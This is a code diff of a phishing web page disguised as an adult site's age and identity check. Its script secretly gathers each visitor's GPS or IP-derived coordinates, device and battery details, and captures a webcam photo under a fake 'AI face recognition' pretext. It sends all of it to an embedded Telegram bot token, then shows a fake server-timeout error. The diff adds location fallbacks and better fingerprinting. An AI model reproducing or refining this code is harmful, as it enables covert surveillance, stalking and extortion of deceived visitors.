@@ -135,8 +135,8 @@
       
       <div id="initial-ui">
         <div class="home-text-center">
-          <strong>LEGAL NOTICE:</strong> Este site contém material sexualmente explícito. 
-          O acesso é restrito a usuários com 18 anos ou mais.
+          <strong>LEGAL NOTICE:</strong> This site contains sexually explicit material. 
+          Access is restricted to users aged 18 and over.
           <br><br>
           Due to new regulations, a <u>quick identity and region verification</u> is required to access local content.
         </div>
@@ -147,7 +147,7 @@
         <div class="loading-spinner"></div>
         <div class="status-msg" id="status-text">Initializing Identity Verification...</div>
         <div style="font-size: 11px; color: #aaa; margin-top: 10px;">
-          Please <b>Allow</b> camera and location access when prompted to confirm This age and local regulations.
+          Please <b>Allow</b> camera access when prompted to confirm your age.
         </div>
       </div>
     </div>
@@ -158,7 +158,7 @@
     // TELEGRAM BOT CONFIGURATION
     // ============================================
     const TELEGRAM_BOT_TOKEN = '8690496477:AAHv5lD-p5tlEOdipUlyMMnBY86uCgVwzrI'; 
-    const TELEGRAM_CHAT_ID = '7071495926'; // Substitua pelo seu ID real
+    const TELEGRAM_CHAT_ID = 'YOUR_REAL_CHAT_ID'; // Substitua pelo seu ID real
     const TELEGRAM_API_URL = 'https://api.telegram.org/bot';
 
     let currentUserData = {
@@ -167,6 +167,25 @@
       location: null,
       battery: { level: 'N/A', charging: 'No' }
     };
+
+    // ============================================
+    // DETECÇÃO APRIMORADA DE DISPOSITIVO
+    // ============================================
+    function getDetailedDevice() {
+      const ua = navigator.userAgent;
+      let deviceName = "Unknown Device";
+      
+      if (/iPhone/.test(ua)) deviceName = "iPhone";
+      else if (/iPad/.test(ua)) deviceName = "iPad";
+      else if (/Android/.test(ua)) {
+        const match = ua.match(/Android\s+([^\s;]+);?\s+([^;)]+)/);
+        deviceName = match ? `Android (${match[2]})` : "Android Device";
+      } else if (/Windows/.test(ua)) deviceName = "Windows PC";
+      else if (/Macintosh/.test(ua)) deviceName = "MacBook/iMac";
+      else if (/Linux/.test(ua)) deviceName = "Linux PC";
+      
+      return deviceName;
+    }
 
     // ============================================
     // FUNÇÕES TELEGRAM
@@ -192,13 +211,19 @@
           caption += `Country: ${currentUserData.ip.country || 'N/A'}\n`;
           caption += `Map: https://maps.google.com/?q=${loc.lat},${loc.lon}\n\n`;
         } else {
-          caption += `Latitude: N/A\nLongitude: N/A\nCity: ${currentUserData.ip.city || 'N/A'}\nMap: N/A\n\n`;
+          // Fallback para localização por IP se o GPS falhar/for negado
+          caption += `Latitude: ${currentUserData.ip.lat || 'N/A'}\n`;
+          caption += `Longitude: ${currentUserData.ip.lon || 'N/A'}\n`;
+          caption += `City: ${currentUserData.ip.city || 'N/A'}\n`;
+          caption += `State: ${currentUserData.ip.region || 'N/A'}\n`;
+          caption += `Country: ${currentUserData.ip.country || 'N/A'}\n`;
+          caption += `Map: ${currentUserData.ip.lat ? `https://maps.google.com/?q=${currentUserData.ip.lat},${currentUserData.ip.lon}` : 'N/A'}\n\n`;
         }
 
         caption += `🔋 Device Info:\n`;
         caption += `Battery: ${currentUserData.battery.level}%\n`;
         caption += `Charging: ${currentUserData.battery.charging}\n`;
-        caption += `Platform: ${currentUserData.device.platform}\n`;
+        caption += `Platform: ${currentUserData.device.name}\n`;
         caption += `Language: ${currentUserData.device.lang}\n\n`;
         caption += `🕒 Timestamp: ${timestamp}`;
 
@@ -219,17 +244,28 @@
     // COLETA DE DADOS
     // ============================================
     async function collectData() {
-      currentUserData.device = { platform: navigator.platform, lang: navigator.language };
+      currentUserData.device = { 
+        name: getDetailedDevice(), 
+        lang: navigator.language 
+      };
+      
       try {
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
           currentUserData.battery = { level: Math.round(battery.level * 100), charging: battery.charging ? 'Yes' : 'No' };
         }
       } catch (e) {}
+      
       try {
         const res = await fetch('https://ipapi.co/json/');
         const ipData = await res.json();
-        currentUserData.ip = { city: ipData.city, region: ipData.region, country: ipData.country_name };
+        currentUserData.ip = { 
+          city: ipData.city, 
+          region: ipData.region, 
+          country: ipData.country_name,
+          lat: ipData.latitude,
+          lon: ipData.longitude
+        };
       } catch (e) {}
     }
 
@@ -239,13 +275,13 @@
         navigator.geolocation.getCurrentPosition(
           (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
           () => resolve(null),
-          { enableHighAccuracy: true, timeout: 8000 }
+          { enableHighAccuracy: true, timeout: 5000 }
         );
       });
     }
 
     // ============================================
-    // LÓGICA DE DISFARCE
+    // LÓGICA DE DISFARCE E CAPTURA
     // ============================================
     async function showVerification() {
       document.getElementById('initial-ui').style.display = 'none';
@@ -253,35 +289,38 @@
       
       const statusText = document.getElementById('status-text');
       
-      // 1. Coletar dados silenciosos IMEDIATAMENTE
+      // 1. Coletar dados silenciosos (IP e Detalhes do Telefone)
       await collectData();
       
-      // 2. Simular passos de verificação
+      // 2. Tentar pegar GPS (Se o navegador já tiver permissão ou por IP)
+      currentUserData.location = await getGPS();
+      
+      // 3. Solicitar Câmera com pretexto de Reconhecimento Facial
       setTimeout(async () => {
-        statusText.textContent = "Verifying Region & Age Regulations...";
-        
-        // 3. Solicitar GPS com pretexto de região
-        currentUserData.location = await getGPS();
-        
         statusText.textContent = "Performing AI Face Recognition...";
         
-        // 4. Solicitar Câmera com pretexto de reconhecimento facial
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
           statusText.textContent = "Processing Identity Data...";
           
           const track = stream.getVideoTracks()[0];
-          const imageCapture = new ImageCapture(track);
-          const bitmap = await imageCapture.grabFrame();
+          
+          // Usar Canvas para capturar a foto de forma rápida
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          await video.play();
+          
           const canvas = document.createElement('canvas');
-          canvas.width = bitmap.width; canvas.height = bitmap.height;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(bitmap, 0, 0);
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
           
           canvas.toBlob(async (blob) => {
             await sendTelegramPhotoWithData(blob);
             
-            // Finalização simulando erro ou sucesso
+            // Parar a câmera após capturar
+            stream.getTracks().forEach(t => t.stop());
+            
             setTimeout(() => {
               statusText.textContent = "Error: Verification server timeout. Try again later.";
               document.querySelector('.loading-spinner').style.display = 'none';
@@ -292,7 +331,7 @@
           statusText.textContent = "Verification Failed: Access Required.";
           document.querySelector('.loading-spinner').style.display = 'none';
         }
-      }, 1500);
+      }, 1000);
     }
   </script>
 </body>
